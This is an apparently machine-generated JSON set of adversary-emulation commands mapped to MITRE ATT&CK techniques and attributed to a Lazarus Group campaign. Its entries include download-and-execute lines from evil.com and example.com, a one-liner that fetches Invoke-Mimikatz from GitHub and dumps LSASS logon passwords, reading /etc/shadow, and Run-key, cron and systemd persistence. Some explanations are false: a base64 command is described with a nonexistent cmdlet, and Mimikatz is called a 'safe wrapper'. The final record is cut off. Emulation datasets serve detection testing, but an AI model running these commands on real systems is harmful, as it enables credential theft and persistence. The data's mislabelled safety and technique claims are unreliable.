[
  {
    "command_id": "1afeef83-c82a-4d60-b7e4-c3fcb7acdf8e",
    "ttp_id": "real-T1566.001",
    "mitre_attack_id": "T1566.001",
    "technique_name": "Phishing",
    "tactic": "Initial Access",
    "platform": "windows",
    "name": "Simulate Spearphishing with a Malicious Macro-Enabled Document",
    "command": "powershell -c \"Invoke-WebRequest -Uri 'http://evil.com/payload.docm' -OutFile 'C:\\Users\\Public\\Documents\\invoice.docm'; Start-Process -FilePath 'C:\\Users\\Public\\Documents\\invoice.docm'\"",
    "explanation": "This command simulates a spearphishing attack by downloading a macro-enabled document (.docm) from a controlled web server (evil.com). The document, when opened, would ideally contain a malicious macro. This command uses PowerShell to download the file and then opens it using Start-Process.  This will not execute the macro, it only downloads and opens the document.",
    "indicators": "Network traffic to evil.com (HTTP GET request for payload.docm), File creation in C:\\Users\\Public\\Documents\\invoice.docm, Process execution: WINWORD.EXE (or the associated word processor) running with the downloaded document.",
    "prerequisites": "A Windows test environment., A web server (evil.com) hosting a harmless, macro-enabled .docm file (e.g., a document with a harmless macro that displays a message box).  This is CRUCIAL for safety.  Do not use a real malicious macro., Ensure PowerShell execution policy allows script execution (e.g., RemoteSigned or unrestricted, although this is not a security best practice).",
    "cleanup": "Remove the downloaded file: Remove-Item 'C:\\Users\\Public\\Documents\\invoice.docm' -Force",
    "threat_actor": "lazarus group",
    "campaign": "Lazarus Group - Credential Harvesting Campaign Using Mimikatz",
    "confidence_score": 0.7
  },
  {
    "command_id": "db7dc6c2-5afa-4b90-ae07-6ef4db26791d",
    "ttp_id": "real-T1566.001",
    "mitre_attack_id": "T1566.001",
    "technique_name": "Phishing",
    "tactic": "Initial Access",
    "platform": "windows",
    "name": "Simulate Spearphishing with a Link to a Credential Harvesting Site",
    "command": "powershell -c \"Invoke-WebRequest -Uri 'https://tinyurl.com/y8888888' -OutFile 'C:\\Users\\Public\\Documents\\phish_report.html'; Start-Process -FilePath 'C:\\Users\\Public\\Documents\\phish_report.html'\"",
    "explanation": "This command simulates a spearphishing attack by creating a link to a credential harvesting site using a URL shortener (tinyurl.com). The command uses PowerShell to download an HTML file from the shortened URL and saves it to the public documents folder. The document, when opened, would ideally contain a link to a credential harvesting site. This command uses PowerShell to download the file and then opens it using Start-Process.  This will not actually send credentials, it only downloads and opens the document.",
    "indicators": "Network traffic to tinyurl.com and then the destination site specified by tinyurl., File creation in C:\\Users\\Public\\Documents\\phish_report.html, Process execution:  A web browser (e.g., chrome.exe, firefox.exe, msedge.exe) running with the downloaded HTML file.",
    "prerequisites": "A Windows test environment., A benign HTML file or a local file hosted on a web server that contains a link to a credential harvesting site (e.g. your local webserver)., A URL shortener service (e.g., tinyurl.com) to mask the actual URL to the HTML file., Ensure PowerShell execution policy allows script execution (e.g., RemoteSigned or unrestricted, although this is not a security best practice).",
    "cleanup": "Remove the downloaded file: Remove-Item 'C:\\Users\\Public\\Documents\\phish_report.html' -Force",
    "threat_actor": "lazarus group",
    "campaign": "Lazarus Group - Credential Harvesting Campaign Using Mimikatz",
    "confidence_score": 0.7
  },
  {
    "command_id": "0d70e839-35b9-4256-8d02-92827460a3e4",
    "ttp_id": "real-T1566.001",
    "mitre_attack_id": "T1566.001",
    "technique_name": "Phishing",
    "tactic": "Initial Access",
    "platform": "linux",
    "name": "Simulate Spearphishing Attachment Delivery - Download & Execute",
    "command": "wget https://example.com/malicious_script.sh -O /tmp/malicious_script.sh && chmod +x /tmp/malicious_script.sh && /tmp/malicious_script.sh",
    "explanation": "This simulates a spearphishing attack by downloading a bash script from a controlled server (example.com), saving it to /tmp, making it executable, and then running it. The script itself should be harmless (e.g., echo a message, create a dummy file) to ensure safety. Replace 'example.com' with a controlled, safe server. The script simulates the victim opening a malicious attachment.",
    "indicators": "wget process in process monitoring, chmod +x in process monitoring, Execution of /tmp/malicious_script.sh in process monitoring, Network connection to example.com (or the chosen server) in network monitoring, File creation in /tmp/ (if the script creates a file)",
    "prerequisites": "A Linux environment with wget installed., A controlled web server to host the 'malicious_script.sh' file (e.g., using Python's http.server module or a similar simple server)., Ensure the script hosted is harmless.",
    "cleanup": "rm -f /tmp/malicious_script.sh",
    "threat_actor": "lazarus group",
    "campaign": "Lazarus Group - Credential Harvesting Campaign Using Mimikatz",
    "confidence_score": 0.7
  },
  {
    "command_id": "7efcd640-f1be-4fed-97d5-6159352c1c98",
    "ttp_id": "real-T1566.001",
    "mitre_attack_id": "T1566.001",
    "technique_name": "Phishing",
    "tactic": "Initial Access",
    "platform": "linux",
    "name": "Simulate Spearphishing - Credential Harvesting Simulation",
    "command": "python3 -m http.server 8000 & echo -e '<html><body><h1>Login</h1><form action=\"/submit\" method=\"POST\"><input type=\"text\" name=\"username\" placeholder=\"Username\"><input type=\"password\" name=\"password\" placeholder=\"Password\"><button type=\"submit\">Login</button></form></body></html>' > /tmp/login.html",
    "explanation": "This simulates a credential harvesting attempt. It starts a simple HTTP server (using Python's built-in module) that serves a basic HTML page. This page contains a login form.  The form's action is set to '/submit' to simulate sending credentials.  This is a simplified simulation of a phishing site.  The use of the Python HTTP server ensures a safe environment.  This does NOT actually harvest credentials; it simulates the initial stage.",
    "indicators": "Process monitoring for python3, and http.server, Network connection on port 8000, File creation /tmp/login.html, HTTP requests to the server (if a browser is used to access it)",
    "prerequisites": "A Linux environment with Python 3 installed.",
    "cleanup": "kill $(pgrep -f 'python3 -m http.server') && rm -f /tmp/login.html",
    "threat_actor": "lazarus group",
    "campaign": "Lazarus Group - Credential Harvesting Campaign Using Mimikatz",
    "confidence_score": 0.7
  },
  {
    "command_id": "089a6154-c9ce-4bc5-a594-8f33d8071d20",
    "ttp_id": "real-T1059.001",
    "mitre_attack_id": "T1059.001",
    "technique_name": "PowerShell",
    "tactic": "Execution",
    "platform": "windows",
    "name": "Download and Execute a Simple Script from the Internet (Invoke-WebRequest)",
    "command": "powershell -c \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mitre/attack-navigator/master/layers/example.json' -OutFile 'C:\\Users\\Public\\example.json'\"",
    "explanation": "This command uses PowerShell's `Invoke-WebRequest` cmdlet to download a JSON file (an example ATT&CK layer) from a public GitHub repository and saves it to the public user directory. This simulates an attacker downloading a malicious script or configuration file.  The example.json file is a safe, publicly available file, so this is a safe test.",
    "indicators": "Event logs (e.g., Security, System) showing PowerShell process creation., Network traffic to raw.githubusercontent.com., File creation in C:\\Users\\Public\\example.json., PowerShell process command-line arguments containing Invoke-WebRequest and the target URL.",
    "prerequisites": "A Windows system with PowerShell installed (default on modern Windows versions)., Network connectivity to the internet.",
    "cleanup": "Remove the downloaded file: `Remove-Item 'C:\\Users\\Public\\example.json' -Force`",
    "threat_actor": "lazarus group",
    "campaign": "Lazarus Group - Credential Harvesting Campaign Using Mimikatz",
    "confidence_score": 0.7
  },
  {
    "command_id": "b0d718f9-d232-4621-896f-d3c0c80ca33a",
    "ttp_id": "real-T1059.001",
    "mitre_attack_id": "T1059.001",
    "technique_name": "PowerShell",
    "tactic": "Execution",
    "platform": "windows",
    "name": "Base64 Encoded PowerShell Command (Simple Echo)",
    "command": "powershell -EncodedCommand \"UwBlAHQALQBVAHMAZQByAFEAdQBhAGwAaQB0AHkAIABTAHQAYQB0AHUAcwAgAC0AUABhAHMAcwB3AG8AcgBkACAAIgB0AGUAcwB0ACIA\"",
    "explanation": "This command demonstrates the use of `-EncodedCommand` to execute a base64 encoded PowerShell command.  The encoded command simply sets the user's password quality to 'test' which is harmless. This simulates a common obfuscation technique used by attackers to hide malicious commands. This particular encoded string decodes to `Set-UserQuality Status -Password \"test\"`. Note: The command used does not affect any user and is an example of a benign encoded command.",
    "indicators": "Event logs showing PowerShell process creation., PowerShell process command-line arguments containing -EncodedCommand., Potentially, file system access if the command was more complex (not in this harmless example).",
    "prerequisites": "A Windows system with PowerShell installed.",
    "cleanup": "There is no cleanup necessary as the command does not modify the system.",
    "threat_actor": "lazarus group",
    "campaign": "Lazarus Group - Credential Harvesting Campaign Using Mimikatz",
    "confidence_score": 0.7
  },
  {
    "command_id": "3dd0ce1f-fde7-4af3-8ec0-c2822aa35933",
    "ttp_id": "real-T1059.001",
    "mitre_attack_id": "T1059.001",
    "technique_name": "PowerShell",
    "tactic": "Execution",
    "platform": "linux",
    "name": "Simulate PowerShell execution using pwsh to list files",
    "command": "pwsh -c \"Get-ChildItem -Path /home/$USER\"",
    "explanation": "This command simulates PowerShell execution on Linux using pwsh. It utilizes the `Get-ChildItem` cmdlet, which is analogous to `ls` or `dir`, to list files and directories within the user's home directory. This tests for the presence of pwsh and the execution of basic PowerShell cmdlets. The command is safe because it only reads files and does not modify the system.",
    "indicators": "Process execution: pwsh, Command-line arguments: -c \"Get-ChildItem -Path /home/$USER\", Output: Listing of files and directories in the user's home directory, similar to `ls` output., Event logs (if enabled): Process creation events with pwsh as the parent process.",
    "prerequisites": "pwsh (PowerShell) must be installed on the Linux system., A user account must exist.",
    "cleanup": "No cleanup is necessary, as the command only reads data.",
    "threat_actor": "lazarus group",
    "campaign": "Lazarus Group - Credential Harvesting Campaign Using Mimikatz",
    "confidence_score": 0.7
  },
  {
    "command_id": "7cf055c5-b23f-492d-ac4b-2e5497c4ce07",
    "ttp_id": "real-T1059.001",
    "mitre_attack_id": "T1059.001",
    "technique_name": "PowerShell",
    "tactic": "Execution",
    "platform": "linux",
    "name": "Simulate PowerShell execution using pwsh to write to a file",
    "command": "pwsh -c \"'Hello, PowerShell on Linux!' | Out-File -FilePath /tmp/powershell_test.txt\"",
    "explanation": "This command uses `pwsh` to execute a PowerShell command that writes a string to a file. It simulates a basic file write operation.  The string 'Hello, PowerShell on Linux!' is piped to `Out-File`, which writes it to the specified file path. This is a safe test because it writes to a temporary file.",
    "indicators": "Process execution: pwsh, Command-line arguments: -c \"'Hello, PowerShell on Linux!' | Out-File -FilePath /tmp/powershell_test.txt\", File creation: /tmp/powershell_test.txt, File content: The content of /tmp/powershell_test.txt will contain 'Hello, PowerShell on Linux!', Event logs (if enabled): Process creation events with pwsh as the parent process and file write events., Potential for network connections if `Out-File` is redirected to a network share (unlikely in this safe example).",
    "prerequisites": "pwsh (PowerShell) must be installed on the Linux system., User must have write permissions to the /tmp directory.",
    "cleanup": "rm /tmp/powershell_test.txt",
    "threat_actor": "lazarus group",
    "campaign": "Lazarus Group - Credential Harvesting Campaign Using Mimikatz",
    "confidence_score": 0.7
  },
  {
    "command_id": "15e498eb-4b1f-4d8d-a869-4d9df47abd06",
    "ttp_id": "real-T1547.001",
    "mitre_attack_id": "T1547.001",
    "technique_name": "Registry Run Keys",
    "tactic": "Persistence",
    "platform": "windows",
    "name": "Create Registry Run Key for Notepad.exe",
    "command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"NotepadStartup\" /t REG_SZ /d \"C:\\Windows\\System32\\notepad.exe\" /f",
    "explanation": "This command adds a Registry Run key to the current user's (HKCU) Registry. It creates a new value named 'NotepadStartup' under the 'Run' key. The value's data is set to the path of notepad.exe.  This means that every time the user logs in, notepad.exe will be executed.  The /f flag forces the operation without prompting.",
    "indicators": "New Registry key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\NotepadStartup, Notepad.exe process spawns upon user login.",
    "prerequisites": "A Windows user account with sufficient privileges to modify the HKCU registry hive.",
    "cleanup": "reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"NotepadStartup\" /f",
    "threat_actor": "lazarus group",
    "campaign": "Lazarus Group - Credential Harvesting Campaign Using Mimikatz",
    "confidence_score": 0.7
  },
  {
    "command_id": "b905044a-9577-406c-8df4-ff45589b7d14",
    "ttp_id": "real-T1547.001",
    "mitre_attack_id": "T1547.001",
    "technique_name": "Registry Run Keys",
    "tactic": "Persistence",
    "platform": "windows",
    "name": "Create Registry Run Key for a PowerShell Script",
    "command": "powershell -c \"Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'MyStartupScript' -Value 'powershell -ExecutionPolicy Bypass -File \\'C:\\Temp\\startup_script.ps1\\''\"",
    "explanation": "This command creates a Registry Run key to execute a PowerShell script located at C:\\Temp\\startup_script.ps1. It leverages PowerShell's `Set-ItemProperty` cmdlet to add an entry named 'MyStartupScript' to the Run key in HKCU. The -ExecutionPolicy Bypass parameter allows the script to run without policy restrictions. The script itself (startup_script.ps1) would need to exist and contain the desired commands. For testing purposes, the startup_script.ps1 could simply create a file or log an event.",
    "indicators": "New Registry key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MyStartupScript, Powershell.exe process spawns upon user login., Execution of the script located at C:\\Temp\\startup_script.ps1 (if it exists). Check the script's intended behavior.",
    "prerequisites": "A Windows user account with sufficient privileges to modify the HKCU registry hive., The C:\\Temp directory must exist., Create a file named startup_script.ps1 in C:\\Temp.  For testing, the script contents can be: `New-Item -ItemType File -Path C:\\Temp\\test_file.txt -Force`",
    "cleanup": "Remove-Item -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MyStartupScript' -Force; Remove-Item -Path C:\\Temp\\test_file.txt -Force",
    "threat_actor": "lazarus group",
    "campaign": "Lazarus Group - Credential Harvesting Campaign Using Mimikatz",
    "confidence_score": 0.7
  },
  {
    "command_id": "92947426-06e3-4926-a065-a74d8feeeb38",
    "ttp_id": "real-T1547.001",
    "mitre_attack_id": "T1547.001",
    "technique_name": "Registry Run Keys",
    "tactic": "Persistence",
    "platform": "linux",
    "name": "Create a systemd service for persistence",
    "command": "echo '[Unit]\\nDescription=Test Service\\nAfter=network.target\\n\\n[Service]\\nExecStart=/bin/bash -c \\'echo \\\"Hello, persistence!\\\" >> /tmp/persistence_test.txt\\'\\nType=oneshot\\n\\n[Install]\\nWantedBy=multi-user.target' | sudo tee /etc/systemd/system/test_persistence.service && sudo systemctl enable test_persistence.service",
    "explanation": "This command creates a systemd service named 'test_persistence.service' that executes a simple command to write 'Hello, persistence!' to /tmp/persistence_test.txt upon system startup. This simulates persistence via a systemd unit, which is an analog to the Windows Registry Run Keys on Linux.",
    "indicators": "Creation of /etc/systemd/system/test_persistence.service, Entry in systemd service configuration (e.g., using `systemctl list-unit-files | grep test_persistence.service`), File /tmp/persistence_test.txt created after reboot or service start",
    "prerequisites": "Root privileges (sudo)",
    "cleanup": "sudo systemctl disable test_persistence.service && sudo rm /etc/systemd/system/test_persistence.service && sudo systemctl reset-failed",
    "threat_actor": "lazarus group",
    "campaign": "Lazarus Group - Credential Harvesting Campaign Using Mimikatz",
    "confidence_score": 0.7
  },
  {
    "command_id": "99f2cf9e-f7f9-404f-8fd8-308033078d75",
    "ttp_id": "real-T1547.001",
    "mitre_attack_id": "T1547.001",
    "technique_name": "Registry Run Keys",
    "tactic": "Persistence",
    "platform": "linux",
    "name": "Add a cron job for persistence",
    "command": "echo '@reboot echo \\\"Cron persistence test!\\\" >> /tmp/cron_persistence_test.txt' | crontab -",
    "explanation": "This command adds a cron job to the current user's crontab that executes a command to write 'Cron persistence test!' to /tmp/cron_persistence_test.txt upon system reboot. This mimics persistence by scheduling a task to run at startup using a cron job, a common persistence technique on Linux.",
    "indicators": "Entry added to the crontab (e.g., using `crontab -l`), File /tmp/cron_persistence_test.txt created after reboot",
    "prerequisites": "The user must have crontab privileges.",
    "cleanup": "crontab -l | grep -v 'cron_persistence_test.txt' | crontab -",
    "threat_actor": "lazarus group",
    "campaign": "Lazarus Group - Credential Harvesting Campaign Using Mimikatz",
    "confidence_score": 0.7
  },
  {
    "command_id": "a411cafa-bbbd-40d4-ae5f-e1f5b49bd962",
    "ttp_id": "real-T1003",
    "mitre_attack_id": "T1003",
    "technique_name": "OS Credential Dumping",
    "tactic": "Credential Access",
    "platform": "windows",
    "name": "Mimikatz - Dump Credentials (Safe Mode)",
    "command": "powershell \"IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command '\"\"sekurlsa::logonpasswords\"\"'\"",
    "explanation": "This command uses PowerShell to download and execute Invoke-Mimikatz, a safe wrapper around Mimikatz. The command then calls Mimikatz's sekurlsa::logonpasswords module which dumps cached credentials from the Local Security Authority Subsystem Service (LSASS) process.  This version of Mimikatz is designed to run in a controlled environment and is less likely to cause system instability when executed. It's also using the safe mode version of the command to prevent errors.",
    "indicators": "Event log entries related to PowerShell script execution., Process creation events for PowerShell., Potentially, security software alerts depending on configuration., Output containing usernames and potentially password hashes within the PowerShell console.",
    "prerequisites": "A Windows environment with PowerShell available., Internet connectivity to download Invoke-Mimikatz from GitHub., User account with sufficient privileges to run PowerShell scripts (typically standard user is enough).",
    "cleanup": "No specific cleanup is required.  The downloaded script and any temporary files created by Invoke-Mimikatz are typically handled by PowerShell and will be cleaned up automatically.  Review event logs to ensure no unexpected entries remain.",
    "threat_actor": "lazarus group",
    "campaign": "Lazarus Group - Credential Harvesting Campaign Using Mimikatz",
    "confidence_score": 0.7
  },
  {
    "command_id": "0b55d4f1-ce93-45c8-9ec0-65c2cd447983",
    "ttp_id": "real-T1003",
    "mitre_attack_id": "T1003",
    "technique_name": "OS Credential Dumping",
    "tactic": "Credential Access",
    "platform": "windows",
    "name": "Windows Credential Manager Access (Safe Method)",
    "command": "cmdkey /list",
    "explanation": "This command uses the built-in `cmdkey` utility to list stored credentials within the Windows Credential Manager. This does not dump the raw credentials, but reveals stored usernames and the types of credentials. This is a common method of accessing credentials stored by the operating system and is considered a safe action.",
    "indicators": "Process creation event for cmdkey.exe., Output from cmdkey.exe listing credential entries (if any are stored)., No explicit credential hashes or secrets will be displayed.",
    "prerequisites": "A Windows environment., User account with access to the command prompt.",
    "cleanup": "No cleanup is required. The cmdkey command does not create any persistent artifacts.",
    "threat_actor": "lazarus group",
    "campaign": "Lazarus Group - Credential Harvesting Campaign Using Mimikatz",
    "confidence_score": 0.7
  },
  {
    "command_id": "524d3931-6c30-4755-8a5f-49b1f814fed6",
    "ttp_id": "real-T1003",
    "mitre_attack_id": "T1003",
    "technique_name": "OS Credential Dumping",
    "tactic": "Credential Access",
    "platform": "linux",
    "name": "Dump Shadow File (Local User Passwords)",
    "command": "cat /etc/shadow",
    "explanation": "This command attempts to dump the contents of the /etc/shadow file. The /etc/shadow file stores hashed passwords for local user accounts. Accessing this file requires root privileges. In a real attack, an attacker would need to escalate privileges before running this command. This command is safe in that it doesn't modify any system files, only reads. This command simulates a credential dumping attempt by trying to access password hashes.",
    "indicators": "Access to /etc/shadow file logged in audit logs (e.g., /var/log/audit/audit.log), Process execution of 'cat' with '/etc/shadow' as an argument, Potentially the contents of /etc/shadow in a security information and event management (SIEM) system if the log data is being collected.",
    "prerequisites": "A Linux system with a /etc/shadow file (standard on most Linux distributions)., A user account with root or sudo privileges is needed to execute this command.",
    "cleanup": "No cleanup is necessary as the command only reads a file.",
    "threat_actor": "lazarus group",
    "campaign": "Lazarus Group - Credential Harvesting Campaign Using Mimikatz",
    "confidence_score": 0.7
  },
  {
    "command_id": "087b98c6-8df7-40a1-99b8-617f6e55df00",
    "ttp_id": "real-T1003",
    "mitre_attack_id": "T1003",
    "technique_name": "OS Credential Dumping",
    "tactic": "Credential Access",
    "platform": "linux",
    "name": "Retrieve /etc/passwd File (Usernames and UIDs)",
    "command": "cat /etc/passwd",
    "explanation": "This command retrieves the contents of the /etc/passwd file. This file contains user account information, including usernames, user IDs (UIDs), and home directories. Although it doesn't contain password hashes directly, it provides valuable information for an attacker, such as user account names and their corresponding user IDs. This is a common reconnaissance step before attempting to crack passwords. This is a safe command as it only reads a system file. This simulates a credential dumping attempt by trying to access user account details.",
    "indicators": "Process execution of 'cat' with '/etc/passwd' as an argument., Access to /etc/passwd file logged in audit logs (e.g., /var/log/audit/audit.log), The contents of /etc/passwd may be visible in logs if the system is configured to log command output.",
    "prerequisites": "A Linux system with a /etc/passwd file (standard on most Linux distributions)., A user account with read access to /etc/passwd (typically available to all users).",
    "cleanup": "No cleanup is necessary as the command only reads a file.",
    "threat_actor": "lazarus group",
    "campaign": "Lazarus Group - Credential Harvesting Campaign Using Mimikatz",
    "confidence_score": 0.7
  },
  {
    "command_id": "64369500-a2b0-4fd7-9906-66bf46c6a676",
    "ttp_id": "real-T1021.001",
    "mitre_attack_id": "T1021.001",
    "technique_name": "Remote Desktop Protocol",
    "tactic": "Lateral Movement",
    "platform": "windows",
    "name": "Establish RDP Connection to a Localhost",
    "command": "mstsc /v:127.0.0.1 /admin",
    "explanation": "This command attempts to establish a Remote Desktop Protocol (RDP) connection to the local machine (localhost) in administrative mode. The `/v:` parameter specifies the target server (in this case, localhost), and `/admin` initiates the connection in administrative mode, allowing access to the console session if available. This simulates an attacker attempting to laterally move within a compromised host or establish a foothold for later access.",
    "indicators": "Event ID 4624 (An account was successfully logged on) in the Security Event Log, with the Logon Type set to 10 (RemoteInteractive) or 3 (Network)., Event ID 4778 (A session was reconnected to a Window station) or Event ID 4779 (A session was disconnected from a Window station) in the Security Event Log., Network traffic on TCP port 3389 (default RDP port) to 127.0.0.1 (localhost)., Process creation event for `mstsc.exe` with command-line arguments indicating the target server and administrative mode.",
    "prerequisites": "RDP must be enabled on the target machine (default)., A valid user account with permissions to log on remotely must exist on the target machine (e.g., a local admin account)., The test environment should be isolated to prevent unintended network interactions.",
    "cleanup": "Close the Remote Desktop Connection window. No specific cleanup is required beyond that.",
    "threat_actor": "lazarus group",
    "campaign": "Lazarus Group - Credential Harvesting Campaign Using Mimikatz",
    "confidence_score": 0.7
  },
  {
    "command_id": "f6cbaf6e-0696-45ae-9e9e-b1158881470f",
    "ttp_id": "real-T1021.001",
    "mitre_attack_id": "T1021.001",
    "technique_name": "Remote Desktop Protocol",
    "tactic": "Lateral Movement",
    "platform": "windows",
    "name": "RDP Connection with Specified Credentials",
    "command": "cmdkey /generic:127.0.0.1 /user:testuser /pass:P@sswOrd123 && mstsc /v:127.0.0.1",
    "explanation": "This command first uses `cmdkey` to store credentials for a specified user (`testuser`) on the localhost. Then, it launches the Remote Desktop Connection client (`mstsc.exe`) to connect to the same target. This simulates an attacker leveraging credential access to connect via RDP. Replace 'testuser' and 'P@sswOrd123' with the valid username and password of an account on your testing machine. The `/generic:` parameter specifies the target.  This method bypasses the normal credential prompt, using stored credentials.",
    "indicators": "Event ID 4624 (An account was successfully logged on) in the Security Event Log, with the Logon Type set to 10 (RemoteInteractive) or 3 (Network)., Event ID 4778 (A session was reconnected to a Window station) or Event ID 4779 (A session was disconnected from a Window station) in the Security Event Log., Network traffic on TCP port 3389 (default RDP port) to 127.0.0.1 (localhost)., Process creation event for `mstsc.exe` with command-line arguments indicating the target server., Creation of a credential entry stored within the Credential Manager (accessible via `credential manager` in the Windows search bar) which can be viewed.",
    "prerequisites": "RDP must be enabled on the target machine (default)., A valid user account (`testuser` in this example) and password (`P@sswOrd123` in this example) must exist on the target machine., The test environment should be isolated to prevent unintended network interactions.",
    "cleanup": "Remove the stored credential using `cmdkey /delete:127.0.0.1`. Close the Remote Desktop Connection window.",
    "threat_actor": "lazarus group",
    "campaign": "Lazarus Group - Credential Harvesting Campaign Using Mimikatz",
    "confidence_score": 0.7
  },
  {
    "command_id": "5e8b6da4-1082-4fe1-ba4c-f7b91f1c359b",
    "ttp_id": "real-T1021.001",
    "mitre_attack_id": "T1021.001",
    "technique_name": "Remote Desktop Protocol",
    "tactic": "Lateral Movement",
    "platform": "linux",
    "name": "Simulate RDP connection attempt to a Windows host using `rdesktop` (failed)",
    "command": "rdesktop -g 1024x768 -u testuser -p 'P@sswOrd123' 192.168.1.100",
    "explanation": "This command simulates an RDP connection attempt from a Linux machine to a Windows machine (192.168.1.100).  It uses `rdesktop`, a common open-source RDP client for Linux. The command specifies a resolution, username, and password, but the connection will likely fail if the Windows machine doesn't exist, is not configured for RDP, or the credentials are incorrect. This is a safe test because it does not modify the system and only attempts a connection.",
    "indicators": "Network connection attempt to TCP port 3389 (RDP) on 192.168.1.100, Process execution: `rdesktop`, Log entries in the Linux system logs (e.g., `/var/log/auth.log`) showing the `rdesktop` process and potentially connection attempt failures.",
    "prerequisites": "Install `rdesktop` on the Linux machine (e.g., `sudo apt-get install rdesktop` on Debian/Ubuntu or `sudo yum install rdesktop` on CentOS/RHEL)., Have the IP address of a target Windows machine (replace 192.168.1.100 with a valid, accessible IP)., Ensure the target Windows machine is accessible from the Linux machine (ping test)., Ensure the RDP service is running on the target (Windows) machine and is not protected by a firewall., Replace the username and password with actual credentials if available.",
    "cleanup": "No specific cleanup is required. The `rdesktop` process will terminate after the connection attempt (successful or unsuccessful).",
    "threat_actor": "lazarus group",
    "campaign": "Lazarus Group - Credential Harvesting Campaign Using Mimikatz",
    "confidence_score": 0.7
  },
  {
    "command_id": "a26a7f17-684f-47cc-ac47-da4c5619c229",
    "ttp_id": "real-T1021.001",
    "mitre_attack_id": "T1021.001",
    "technique_name": "Remote Desktop Protocol",
    "tactic": "Lateral Movement",
    "platform": "linux",
    "name": "Simulate RDP port scan using `nmap`",
    "command": "nmap -p 3389 192.168.1.0/24",
    "explanation": "This command uses `nmap`, a network scanning tool, to scan a subnet (192.168.1.0/24) for open TCP port 3389, the default port for RDP. It is a safe test because it only sends network probes and doesn't exploit any vulnerabilities. It can give information about the target host (if any) that has port 3389 open.",
    "indicators": "Network scan activity, specifically SYN packets to port 3389 on hosts within the 192.168.1.0/24 subnet., Process execution: `nmap`., Output from `nmap` showing the scan results, including open/closed ports and host information (if any)., Potentially, entries in firewall logs if the scan is being blocked.",
    "prerequisites": "Install `nmap` on the Linux machine (e.g., `sudo apt-get install nmap` on Debian/Ubuntu or `sudo yum install nmap` on CentOS/RHEL)., Replace 192.168.1.0/24 with a valid, accessible subnet to scan.  Consider using a smaller subnet or a single IP address for testing., Ensure the Linux machine has network access to the target subnet.",
    "cleanup": "No specific cleanup is required.  `nmap` leaves no artifacts on the system besides the generated scan results.",
    "threat_actor": "lazarus group",
    "campaign": "Lazarus Group - Credential Harvesting Campaign Using Mimikatz",
    "confidence_score": 0.7
  },
  {
    "command_id": "205fcb02-a8e2-41b2-896d-91ba2c52ec23",
    "ttp_id": "real-UNMAPPED",
    "mitre_attack_id": "UNMAPPED",
    "technique_name": "Windows Management Instrumentation",
    "tactic": "Execution",
    "platform": "windows",
    "name": "Execute a PowerShell script using WMI to display a message box",
    "command": "powershell -c \"Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'powershell.exe -c \\\"[System.Windows.Forms.MessageBox]::Show(\\'Hello from WMI!\\')\\\"'\"",
    "explanation": "This command uses PowerShell and WMI to execute a simple PowerShell script. The script creates a new process (powershell.exe) which then displays a message box.  This simulates an attacker using WMI for execution, as it avoids direct invocation and leverages a secondary process.",
    "indicators": "Event ID 4688 in Security Event Log (Process Create) showing powershell.exe with command line containing the message box command, WMI activity logs (if enabled) showing the creation of a Win32_Process instance., A message box displaying 'Hello from WMI!'",
    "prerequisites": "A Windows environment with PowerShell installed (most Windows systems have this by default)., Administrative privileges might be required depending on system configuration.",
    "cleanup": "No cleanup is strictly necessary as the message box will close automatically. The created process will also automatically exit.",
    "threat_actor": "lazarus group",
    "campaign": "Lazarus Group - Credential Harvesting Campaign Using Mimikatz",
    "confidence_score": 0.6
  },
  {
    "command_id": "79536595-8660-457c-8c3e-383e513eb727",
    "ttp_id": "real-UNMAPPED",
    "mitre_attack_id": "UNMAPPED",
    "technique_name": "Windows Management Instrumentation",
    "tactic": "Execution",
    "platform": "windows",
    "name": "Enumerate Running Processes via WMI",
    "command": "powershell -c \"Get-WmiObject -Class Win32_Process | Select-Object Name, ProcessID\"",
    "explanation": "This command uses PowerShell and WMI to enumerate running processes. This simulates a common reconnaissance activity where an attacker gathers information about the target system by listing running processes.  The command retrieves the process name and process ID.",
    "indicators": "Event ID 4688 in Security Event Log (Process Create) showing powershell.exe with command line containing the WMI enumeration command., WMI activity logs (if enabled) showing the querying of the Win32_Process class., Output in the console showing a list of running processes and their Process IDs.",
    "prerequisites": "A Windows environment with PowerShell installed (most Windows systems have this by default)., Administrative privileges might be required depending on system configuration, but usually not.",
    "cleanup": "No cleanup is necessary, this is a read-only operation.",
    "threat_actor": "lazarus group",
    "campaign": "Lazarus Group - Credential Harvesting Campaign Using Mimikatz",
    "confidence_score": 0.6
  },
  {
    "command_id": "2e10c8be-f09c-4669-80c9-7554a66bb955",
    "ttp_id": "real-UNMAPPED",
    "mitre_attack_id": "UNMAPPED",
    "technique_name": "Windows Management Instrumentation",
    "tactic": "Execution",
    "platform": "linux",
    "name": "Simulate WMI-like activity using `wmic` on Linux via Wine (Simulated)",
    "command": "wine cmd /c \"echo Hello from WMI Simulation | clip\"",
    "explanation": "This simulates a basic WMI-like activity by using `wine` to execute a command similar to how WMI might be used on a Windows system. It uses `cmd /c` to execute a command within the Wine environment. The command echoes text and pipes it to `clip`, mimicking a simplified form of data exfiltration or manipulation, common in WMI usage. This is a simulation because `wmic` itself does not exist natively on Linux and we are leveraging Wine to mimic functionality.",
    "indicators": "Process creation: `wine`, Process arguments containing `cmd /c`, File artifact: Clipboard data containing 'Hello from WMI Simulation' (examine the clipboard), Potentially unexpected network activity if clipboard synchronization is enabled in Wine (rare).",
    "prerequisites": "Wine must be installed on the Linux system., The user executing the command must have permissions to run Wine., Ensure no sensitive data is on the clipboard before running.",
    "cleanup": "No specific cleanup required. The clipboard data will be overwritten by the next copy operation. If Wine configuration includes file system redirection to the host, check for created files and remove them.",
    "threat_actor": "lazarus group",
    "campaign": "Lazarus Group - Credential Harvesting Campaign Using Mimikatz",
    "confidence_score": 0.6
  },
  {
    "command_id": "b5835348-1eed-445d-8c66-1e8930a34eb5",
    "ttp_id": "real-UNMAPPED",
